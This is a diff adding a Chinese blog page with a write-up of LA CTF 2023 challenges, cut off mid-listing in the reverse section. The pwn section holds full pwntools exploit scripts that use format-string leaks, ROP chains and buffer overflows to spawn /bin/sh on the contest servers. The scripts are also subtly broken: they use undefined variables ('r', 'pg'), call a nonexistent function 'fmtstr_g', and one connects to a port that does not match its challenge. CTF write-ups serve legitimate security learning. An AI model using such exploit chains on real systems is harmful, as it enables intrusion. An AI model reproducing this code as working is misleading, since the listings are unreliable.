@@ -1,0 +1,719 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/url.jpg">
+  <link rel="icon" href="/img/url.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Hor1zon">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="LA CTF-Write Up">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LA CTF-wp by Hor1zon">
+<meta property="og:url" content="http://example.com/2023/02/14/LA%20CTF/index.html">
+<meta property="og:site_name" content="J_0k3r">
+<meta property="og:description" content="LA CTF-Write Up">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/lactf.png">
+<meta property="article:published_time" content="2023-02-14T06:27:32.000Z">
+<meta property="article:modified_time" content="2023-02-14T06:20:27.039Z">
+<meta property="article:author" content="J_0k3r">
+<meta property="article:tag" content="Write Up">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/lactf.png">
+  
+  
+  
+  <title>LA CTF-wp by Hor1zon - J_0k3r</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":150,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>J_0k3r的秘密基地</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/wp13.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="LA CTF-wp by Hor1zon"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Hor1zon
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-02-14 14:27" pubdate>
+          2023年2月14日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          29k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          240 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">LA CTF-wp by Hor1zon</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><strong>题目附件官方：<a target="_blank" rel="noopener" href="https://github.com/uclaacm/lactf-archive/tree/master/2023">https://github.com/uclaacm/lactf-archive/tree/master/2023</a></strong></p>
+<p><img src="/img/g.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/mdimg/lactf/640.gif" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="metaverse"><a href="#metaverse" class="headerlink" title="metaverse"></a>metaverse</h3><h4 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h4><p>Metaenter the metaverse and metapost about metathings. All you have to metado is metaregister for a metaaccount and you’re good to metago.<br><a target="_blank" rel="noopener" href="https://metaverse.lac.tf/">https://metaverse.lac.tf/</a><br>You can metause our fancy new metaadmin metabot to get the admin to metaview your metapost!</p>
+<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>g0at：应该是有人(zhanyi✌)打穿了，鼠鼠直接捡漏，账号密码123就直接进去了捏<br><img src="/mdimg/lactf/1.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="college-tour"><a href="#college-tour" class="headerlink" title="college-tour"></a><strong>college-tour</strong></h3><h4 id="题目说明-1"><a href="#题目说明-1" class="headerlink" title="题目说明"></a>题目说明</h4><p>Welcome to UCLA! To explore the #1 public college, we have prepared a scavenger hunt for you to walk all around the beautiful campus.<br><img src="/mdimg/lactf/2.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="/mdimg/lactf/3.png" srcset="/img/loading.gif" lazyload><br>到处找flag就行了<br><code>lactf&#123;j03_4nd_j0S3phIn3_bRU1n_sAY_hi&#125;</code></p>
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="rut-roh-relro"><a href="#rut-roh-relro" class="headerlink" title="rut-roh-relro"></a><strong>rut-roh-relro</strong></h3><h4 id="题目说明-2"><a href="#题目说明-2" class="headerlink" title="题目说明"></a>题目说明</h4><p>My friend keeps writing super insecure C programs but I’m too lazy to fix his code. I’m sure it’ll be fine as long as I use enough exploit mitigations, right?<br><code>nc lac.tf 31134</code></p>
+<h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./rut_roh_relro&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;lac.tf&quot;</span>,<span class="hljs-number">31134</span>)<br>elf = ELF(<span class="hljs-string">&quot;./rut_roh_relro&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;terminator&#x27;</span>, <span class="hljs-string">&#x27;--new-tab&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">src</span>):<br>    gdb.attach(p,src)<br>    pause()<br><br>src = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *$rebase(0x11C6)</span><br><span class="hljs-string">b *$rebase(0x1201)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># dbg(src)</span><br>g=<span class="hljs-string">&quot;%71$p %72$p&quot;</span><br>p.sendlineafter(<span class="hljs-string">&quot;What would you like to post?&quot;</span>,g)<br><br>p.recvuntil(<span class="hljs-string">&quot;Here&#x27;s your latest post:\n&quot;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(r.recvuntil(<span class="hljs-string">&quot; &quot;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>) - <span class="hljs-number">234</span> - libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>success(<span class="hljs-string">&quot;libc_base = &quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br>stack_addr = <span class="hljs-built_in">int</span>(r.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>ret_stack = stack_addr - <span class="hljs-number">0xf0</span><br>success(<span class="hljs-string">&quot;ret_stack = &quot;</span>+<span class="hljs-built_in">hex</span>(ret_stack))<br><br>start_stack = stack_addr - <span class="hljs-number">0xf0</span> - <span class="hljs-number">0x20</span><br><br>gadget = <span class="hljs-number">0xc967a</span><br>one_gadget = libc_base+gadget<br><br>system_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>pop_rdi_ret = libc_base + <span class="hljs-number">0x0000000000023796</span><br><br>g = fmtstr_g(<span class="hljs-number">6</span>, &#123;ret_stack:pop_rdi_ret,ret_stack+<span class="hljs-number">8</span>:bin_sh,ret_stack+<span class="hljs-number">0x10</span>:system_addr&#125;, write_size=<span class="hljs-string">&#x27;byte&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;What would you like to post?&quot;</span>,pg)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+<p><img src="/mdimg/lactf/4.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="redact"><a href="#redact" class="headerlink" title="redact"></a>redact</h3><h4 id="题目说明-3"><a href="#题目说明-3" class="headerlink" title="题目说明"></a>题目说明</h4><p>I heard C was insecure so I wrote my flag redactor program in C++.<br><code>nc lac.tf 31281</code><br>Note: There are multiple optimized implementations of <code>memmove</code> and one is selected at runtime based on available CPU features, meaning that any solution that uses the <code>memmove</code> GOT entry could fail on remote. The challenge is solvable without <code>memmove</code>.</p>
+<h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./redact&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;lac.tf&quot;</span>,<span class="hljs-number">31181</span>)<br>elf = ELF(<span class="hljs-string">&quot;./redact&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;terminator&#x27;</span>, <span class="hljs-string">&#x27;--new-tab&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">src</span>):<br>    gdb.attach(p,src)<br>    pause()<br><br>src = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *0x40149a</span><br><span class="hljs-string">b *0x4012F9</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>pop_rdi_ret = <span class="hljs-number">0x000000000040177b</span><br>pop_rsi_r15_ret = <span class="hljs-number">0x0000000000401779</span><br>start_addr = <span class="hljs-number">0x401120</span><br><br><span class="hljs-comment"># dbg(src)</span><br>g=<span class="hljs-string">&#x27;a&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;Enter some text: &quot;</span>,g)<br><br>g=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x48</span>+p64(pop_rdi_ret)+p64(<span class="hljs-number">0x4040C0</span>)+p64(pop_rsi_r15_ret)+p64(<span class="hljs-number">0x403FE8</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x4010C0</span>)+p64(start_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;Enter a placeholder: &quot;</span>,g)<br><br>index = <span class="hljs-number">0</span><br>p.sendlineafter(<span class="hljs-string">&quot;Enter the index of the stuff to redact: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br>libc_base = u64(r.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)) - libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>success(<span class="hljs-string">&quot;libc_base = &quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br>system_addr = libc_base+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base+libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br><br>g=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x48</span>+p64(pop_rdi_ret)+p64(bin_sh)+p64(system_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;Enter a placeholder: &quot;</span>,g)<br>index = <span class="hljs-number">0</span><br>p.sendlineafter(<span class="hljs-string">&quot;Enter the index of the stuff to redact: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+<p><img src="/mdimg/lactf/5.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="gatekeep"><a href="#gatekeep" class="headerlink" title="gatekeep"></a>gatekeep</h3><h4 id="题目说明-4"><a href="#题目说明-4" class="headerlink" title="题目说明"></a>题目说明</h4><p>If I gaslight you enough, you won’t be able to get my flag! :)<br><code>nc lac.tf 31121</code><br>Note: The attached binary is the exact same as the one executing on the remote server.</p>
+<h4 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h4><p>g0at：一眼丁真的签到题<br><img src="/mdimg/lactf/6.png" srcset="/img/loading.gif" lazyload><br>主函数，调用了<code>check()</code>函数，跟一下<br><img src="/mdimg/lactf/7.png" srcset="/img/loading.gif" lazyload><br>逻辑也很简单，让猜密码，密码正确就可以<code>print_flag()</code>但是<code>gets()</code>这里有很明显的溢出，可以看到<code>char s1[15]</code>，所以我们只要输入一个大的数就可以直接绕过<code>check()</code>函数，直接cat flag<br><img src="/mdimg/lactf/9.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="bot"><a href="#bot" class="headerlink" title="bot"></a>bot</h3><h4 id="题目说明-5"><a href="#题目说明-5" class="headerlink" title="题目说明"></a>题目说明</h4><p>I made a bot to automatically answer all of your questions.<br><code>nc lac.tf 31180</code></p>
+<h4 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;lac.tf&quot;</span>, <span class="hljs-number">31180</span>)<br>p.recv()<br>g = <span class="hljs-string">b&quot;may i have the flag?\0&quot;</span><br>g += <span class="hljs-string">b&quot;A&quot;</span>*(<span class="hljs-number">64</span>-<span class="hljs-built_in">len</span>(g))<br>g += <span class="hljs-string">b&#x27;BBBBBBBB&#x27;</span><br>g += p64(<span class="hljs-number">0x40129a</span>)<br>p.sendline(g)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="caterpillar"><a href="#caterpillar" class="headerlink" title="caterpillar"></a>caterpillar</h3><h4 id="题目说明-6"><a href="#题目说明-6" class="headerlink" title="题目说明"></a>题目说明</h4><p>-<del>-</del>-<del>-</del>[]? -<del>-</del>-<del>-</del>[].</p>
+<h4 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h4><p>附件为js文件，简言之可以理解为对flag逐一判断是否等于某个值。图中的 <strong>-~[]</strong> 这样的书写形式很特别，猜测可能代表常量？于是在浏览器console解析，发现可以解析为整数常量。那么思路显而易见，把if中代码改成赋值语句即可。<br><img src="/mdimg/lactf/10.png" srcset="/img/loading.gif" lazyload><br><img src="/mdimg/lactf/11.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> flag = <span class="hljs-title class_">Array</span>(<span class="hljs-number">55</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">0</span>)<br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] 